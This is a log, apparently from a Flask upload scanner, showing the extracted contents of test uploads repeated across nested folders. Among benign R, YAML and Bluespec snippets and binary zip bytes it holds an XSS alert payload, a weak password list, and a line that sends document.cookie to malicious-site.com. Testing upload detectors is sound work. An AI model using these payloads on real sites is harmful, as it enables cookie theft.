2025-02-22 21:01:54,343 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,344 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,346 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:01:54,347 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,348 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,349 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,350 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,351 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,352 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:01:54,353 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,354 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,355 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:01:54,357 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:01:54,358 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:01:54,359 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:01:54,360 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,361 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,362 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,363 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:01:54,365 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,366 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,367 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:01:54,368 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:01:54,369 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:01:54,371 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:01:54,373 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,374 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,375 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,376 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:01:54,379 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,380 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,381 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:01:54,382 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:01:54,384 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:01:54,385 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:01:54,386 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,387 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,388 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,389 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:01:54,392 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,393 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,394 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:01:54,395 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:01:54,396 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:01:54,398 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:01:54,399 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,401 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,402 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,403 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:01:54,405 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,406 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,408 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,409 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,410 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,411 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:01:54,412 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,413 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,414 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,415 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,416 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,416 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:01:54,417 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,418 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,420 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,421 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,422 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,423 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:01:54,424 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,425 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,426 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,427 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,428 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,429 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:01:54,430 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,431 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,432 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,433 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:08,986 - Extracted content from uploads/flask_file_upload_2.zip: PK     șVZ               flask_file_upload/UT
 ԹgԹgԹgux     PK   VZ        /  *   flask_file_upload/create_malicious_xlsx.pyUT
 qԹgԹgԹgux     }RJ0}W\CZA|P0]Ň
e|YzaiRtI[MyJ=prɵ*@(]#ޔެA90⪠3*ji6 w.ࡅ{ƇJ~hen|"j^'YžXnF8 SjiTLI#ʫۖ?2p	9TtwI'4+$wh._ur?椉[*"b>XdeHNǠ?W̰PVjgiWڎz;s2jYILXTQRjm95<m
*TIV:
Ӽt2	#XS7'Z-DOVKͥ#1 xQd+!vIQ<3,û8PK  /  PK   VZ        '  &   flask_file_upload/metadata_analysis.pyUT
 z¹g¹gz¹gux     UQO0~ϯ8
2025-02-22 21:02:09,729 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 21:02:09,731 - Extracted content from uploads/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:02:09,732 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:02:09,734 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:02:09,735 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:02:09,737 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:02:09,738 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,739 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,740 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,741 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:02:09,743 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,744 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,745 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:02:09,747 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

